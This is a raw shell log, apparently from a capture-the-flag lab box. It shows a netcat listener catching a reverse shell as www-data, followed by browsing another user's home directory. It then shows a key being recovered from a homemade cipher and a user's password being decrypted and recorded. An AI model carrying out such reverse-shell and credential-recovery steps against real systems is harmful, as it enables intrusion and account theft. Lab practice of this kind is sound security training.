allenwest1@debian:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:65:f0:2f brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe65:f02f/64 scope link 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none 
    inet 10.10.14.5/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1003/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::2ca8:a9af:cf01:e54a/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
allenwest1@debian:~/Desktop$ nc -lvp 12345
listening on [any] 12345 ...
10.10.10.168: inverse host lookup failed: Unknown host
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.168] 49656
www-data@obscure:/$ whoami
whoami
www-data
www-data@obscure:/$ cd /home
cd /home
www-data@obscure:/home$ ls
ls
robert
www-data@obscure:/home$ cd robert
cd robert
www-data@obscure:/home/robert$ ls
ls
BetterSSH
check.txt
out.txt
passwordreminder.txt
SuperSecureCrypt.py
user.txt
www-data@obscure:/home/robert$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@obscure:/home/robert$ cat passwordreminder.txt
cat passwordreminder.txt
ÑÈÌÉàÙÁÑé¯·¿kwww-data@obscure:/home/robert$ ls
ls
BetterSSH
check.txt
out.txt
passwordreminder.txt
SuperSecureCrypt.py
user.txt
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -o /tmp/key.txt -k "$(cat check.txt)" -d
k.txt)" -dperSecureCrypt.py -i out.txt -o /tmp/key.txt -k "$(cat check
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to /tmp/key.txt...
www-data@obscure:/home/robert$ cat /tmp/key.txt
cat /tmp/key.txt
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichaiwww-data@obscure:/home/robert$ 
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/password -k alexandrovich -d
-k alexandrovich -dCrypt.py -i passwordreminder.txt -o /tmp/password -
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/password...
www-data@obscure:/home/robert$ cat /tmp/password
cat /tmp/password
SecThruObsFTW
www-data@obscure:/home/robert$ 
.
.
.
// robert:SecThruObsFTW
.
